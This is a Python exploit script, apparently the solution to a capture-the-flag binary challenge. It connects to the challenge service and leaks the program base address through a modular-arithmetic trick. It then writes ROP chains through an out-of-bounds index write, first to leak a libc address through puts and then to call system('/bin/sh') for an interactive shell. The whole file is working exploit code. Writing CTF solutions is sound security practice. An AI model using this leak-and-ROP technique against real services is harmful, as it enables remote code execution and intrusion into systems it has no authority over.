import os
from sage.all import *
from ptrlib import *

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9001")

libc = ELF("../distfiles/libc-2.31.so")
elf = ELF("../distfiles/chall")
sock = Socket(HOST, int(PORT))

"""
Step 1. Address leak
"""
n = (1<<64) // 8
sock.sendlineafter(": ", str(n))
t = int(sock.recvlineafter("$"))
# y * x = t mod 2^32, where y \in (0x5500, 0x5700) and x = ??? mod 2^12
x = var('x')
proc_base = None
for y in range(0x5500, 0x5700):
    candidates = solve_mod(y * x == t, 2**32)
    for lower in candidates:
        if int(lower[0]) & 0xfff == 0xb6c:
            proc_base = (y << 32) | int(lower[0]) - 0xb6c
            break
    if proc_base is not None:
        break
logger.info("proc = " + hex(proc_base))

rop_pop_rdi = proc_base + 0x00000d53

"""
Step 2. ROP to leak libc address
"""
sock.sendlineafter("]", "1")
chain = [
    rop_pop_rdi,
    proc_base + elf.got('puts'),
    proc_base + elf.plt('puts'),
    proc_base + elf.symbol('main'),
]
ofs = 11
for qword in chain:
    sock.sendlineafter(": ", str(ofs))
    sock.sendlineafter("$", str(qword & 0xffffffff))
    sock.sendlineafter(": ", str(qword >> 32))
    ofs += 1
sock.sendlineafter(": ", "-1")

sock.recvline()
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol('puts')
logger.info("libc = " + hex(libc_base))

"""
Step 3. ROP to win
"""
sock.sendlineafter(": ", str(n))
sock.sendlineafter("]", "1")
chain = [
    rop_pop_rdi + 1,
    rop_pop_rdi,
    libc_base + next(libc.find('/bin/sh')),
    libc_base + libc.symbol('system')
]
ofs = 11
for qword in chain:
    sock.sendlineafter(": ", str(ofs))
    sock.sendlineafter("$", str(qword & 0xffffffff))
    sock.sendlineafter(": ", str(qword >> 32))
    ofs += 1
sock.sendlineafter(": ", "-1")

sock.interactive()
